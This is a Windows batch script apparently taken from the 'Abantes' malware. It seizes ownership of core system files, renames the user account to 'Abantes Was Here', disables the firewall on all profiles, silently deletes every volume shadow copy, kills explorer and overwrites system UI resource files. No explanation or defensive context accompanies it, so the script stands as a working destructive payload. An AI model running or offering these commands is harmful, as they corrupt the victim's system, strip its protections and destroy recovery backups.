@echo on
cd\&cd Windows\System32
takeown /f logonui.exe
icacls logonui.exe /granted %username%:F
takeown /f "C:\Windows\System32\en-US" /r /d y
icacls "C:\Windows\System32\en-US" /granted %username%:F /T /C
cd\&cd Windows
takeown /f explorer.exe
takeown /f regedit.exe
takeown /f HelpPane.exe
takeown /f "C:\Windows\Temp" /r /d y
takeown /f "C:\Windows\en-US" /r /d y
icacls "C:\Windows\Temp" /granted %username%:F /T /C
icacls "C:\Windows\en-US" /granted %username%:F /T /C
icacls regedit.exe /granted %username%:F
icacls explorer.exe /granted %username%:F
icacls HelpPane.exe /granted %username%:F
wmic useraccount where name='%username%' set FullName='Abantes Was Here'
wmic useraccount where name='%username%' rename 'Abantes Was Here'
NetSh Advfirewall set allprofiles state off
vssadmin delete shadows /all /quiet
taskkill /f /im explorer.exe
TIMEOUT 1
copy "C:\Windows\Defender\authui.dll.mui" "C:\Windows\System32\en-US\authui.dll.mui" /Y
copy "C:\Windows\Defender\explorer.exe.mui" "C:\Windows\en-US\explorer.exe.mui" /Y
TIMEOUT 2
